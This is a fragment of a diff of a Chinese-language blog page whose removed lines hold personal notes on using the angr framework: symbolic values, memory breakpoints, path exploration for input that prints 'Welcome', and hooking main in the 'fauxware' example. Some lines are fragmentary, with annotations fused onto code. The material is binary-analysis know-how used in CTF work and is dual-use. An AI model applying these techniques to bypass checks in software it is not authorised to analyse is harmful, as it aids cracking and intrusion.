class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr, archinfo</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span><span class="params">()</span>:</span></span><br><span class="line">  proj = angr.Project(<span class="string">'./mem'</span>)<span class="comment">#加载程序</span></span><br><span class="line">  <span class="keyword">print</span> hex(proj.entry)</span><br><span class="line">  state = proj.factory.entry_state() <span class="comment">#打开到入口点</span></span><br><span class="line">  br = state.solver.BVS(<span class="string">"br"</span>, <span class="number">32</span>)<span class="comment">#添加随机串32位</span></span><br><span class="line">  <span class="comment">#state.solver.add(br &gt; 100)#约束</span></span><br><span class="line">  state.solver.add(br &lt; <span class="number">102</span>)</span><br><span class="line">  state.solver.add(br.SGT(<span class="number">100</span>))</span><br><span class="line">  state.memory.store(<span class="number">0x601030</span>, br)<span class="comment">#更改内存为随机串</span></span><br><span class="line">  simgr = proj.factory.simulation_manager(state)<span class="comment">#管理（固定的）</span></span><br><span class="line">  simgr.run()<span class="comment">#暴力全执行</span></span><br><span class="line">  <span class="keyword">print</span> simgr</span><br><span class="line">  <span class="keyword">for</span> value <span class="keyword">in</span> simgr.stashes.values():</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> value:</span><br><span class="line">      <span class="keyword">print</span> hex(s.solver.eval(br))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  basic_symbolic_execution()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">state.inspect.b(<span class="string">'mem_write'</span>, when=angr.BP_AFTER, action=debug_func)内存断点在写后并且执行debug函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">"Welcome"</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))约束</span><br><span class="line">  <span class="keyword">print</span> simgr</span><br><span class="line">  <span class="keyword">return</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  k = state.posix.files[<span class="number">0</span>].read_from(<span class="number">1</span>)<span class="comment">#写入stdin一个并满足约束</span></span><br><span class="line">  state.solver.add(k.SGE(<span class="number">0x30</span>))</span><br><span class="line">  state.solver.add(k.SLE(<span class="number">0x39</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> Project, SimProcedure</span><br><span class="line">project = Project(<span class="string">'./fauxware'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BugFree</span><span class="params">(SimProcedure)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, argc, argv)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this assumes we have symbols for the binary</span></span><br><span class="line">project.hook_symbol(<span class="string">'main'</span>, BugFree())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 钩子</span></span><br><span class="line">simgr = project.factory.simulation_manager()</span><br><span class="line">project._sim_procedures </span><br><span class="line">simgr.run() </span><br><span class="line"><span class="keyword">print</span> simgr.deadended[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
 
 <nav id="pagination">
   
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </nav>
@@ -895,15 +918,15 @@ fuzzing
   <ul class="entry">
     
       <li>
-        <a href="/2018/07/07/sulb/">slub</a>
+        <a href="/2018/08/20/hfo/"></a>
       </li>
     
       <li>
-        <a href="/2018/07/07/afl/">afl</a>
+        <a href="/2018/07/07/rtd/">return to dl-resolve</a>
       </li>
     
       <li>
-        <a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a>
+        <a href="/2018/07/07/bpf/">bpf</a>
       </li>
     
       <li>
@@ -911,7 +934,7 @@ fuzzing
       </li>
     
       <li>
-        <a href="/2018/07/07/hexo/">搭建博客</a>
+        <a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a>
       </li>
     
   </ul>
